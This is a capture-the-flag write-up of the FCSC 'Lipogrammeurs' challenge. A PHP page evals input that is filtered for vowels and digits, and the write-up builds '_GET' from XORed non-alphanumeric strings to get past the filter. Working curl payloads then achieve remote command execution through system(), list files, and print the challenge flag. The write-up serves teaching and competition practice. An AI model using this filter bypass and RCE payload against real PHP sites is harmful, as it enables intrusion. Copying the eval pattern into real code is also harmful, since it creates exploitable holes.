# Lipogrammeurs

> Vous avez trouvé cette page qui vous semble étrange. Pouvez-vous nous convaincre qu'il y a effectivement un problème en retrouvant le flag présent sur le serveur ?
> 
> URL : http://challenges2.france-cybersecurity-challenge.fr:5008/

```php
<?php
    if (isset($_GET['code'])) {
        $code = substr($_GET['code'], 0, 250);
        if (preg_match('/a|e|i|o|u|y|[0-9]/i', $code)) {
            die('No way! Go away!');
        } else {
            try {
                eval($code);
            } catch (ParseError $e) {
                die('No way! Go away!');
            }
        }
    } else {
        show_source(__FILE__);
    }
```

This `eval()` looks pretty easy to exploit. No vowels (lol), no digits, case-insensitive.

I found a nice trick which does exactly what we need to `eval` any input, regardless of the ~~very strong~~ filter. It's based on XOR operator and enables us to build any string using only characters in a custom charset. For example:

```php
php > $_ = "~}`|" ^ "!:%(";
php > var_dump($_ === '_GET');
bool(true)
```

with the following charset ```$_'"`!~%(```. No filtered character :D

I wrote a Python script to find the "XORed version" of any string. You can download it [here](https://github.com/ZanyMonk/Toolz/blob/master/str2noAlnumPHPString.py).

```php
$ ./str2noAlnumPHPString.py -m "a-z0-9'" _GET
$_="~}`|"^"!:%(";    # $_ = "_GET";
```

We can now access any `GET` argument passed to the PHP script, then executing a function becomes trivial:

```
$ curl "http://challenges2.france-cybersecurity-challenge.fr:5008/?code=$(echo -n '$_="~}`|"^"!:%(";$$_["_"]();' | t url -a)&_=phpinfo"
<html xmlns="http://www.w3.org/1999/xhtml"><head>
<style type="text/css">
body {background-color: #fff; color: #222; font-family: sans-serif;}
...
```

We have an RCE :D

```
$ curl "http://challenges2.france-cybersecurity-challenge.fr:5008/?code=$(echo -n '$_="~}`|"^"!:%(";$$_["_"]($$_["__"]);' | t url)&_=system&__=$(echo -n 'ls -la'| t url)"
total 16
dr-xr-xr-x 1 root root 4096 Apr 27 14:33 .
drwxr-xr-x 1 root root 4096 Apr 27 14:33 ..
-r--r--r-- 1 root root  115 Apr 27 14:32 .flag.inside.J44kYHYL3asgsU7R9zHWZXbRWK7JjF7E.php
-r-xr-xr-x 1 root root  304 Apr 27 14:32 index.php

...

$ curl "http://challenges2.france-cybersecurity-challenge.fr:5008/?code=$(echo -n '$_="~}`|"^"!:%(";$$_["_"]($$_["__"]);' | t url)&_=system&__=$(echo -n 'cat .*'| t url)" 
<?php
        // Well done!! Here is the flag:
        // FCSC{53d195522a15aa0ce67954dc1de7c5063174a721ee5aa924a4b9b15ba1ab6948}
```